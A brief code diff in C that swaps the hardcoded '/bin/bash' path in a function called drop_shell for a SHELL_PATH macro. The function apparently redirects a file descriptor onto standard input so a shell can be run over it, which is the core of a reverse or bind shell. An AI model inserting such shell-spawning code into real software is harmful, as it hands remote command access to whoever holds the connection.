@@ -62,7 +62,7 @@ void fini(void)
 
 void drop_shell(int fd)
 {
-    char *argv[] = {"/bin/bash", "--norc", NULL};
+    char *argv[] = {SHELL_PATH, "--norc", NULL};
     char *envp[] = {NULL};
 
     dup2(fd, 0);
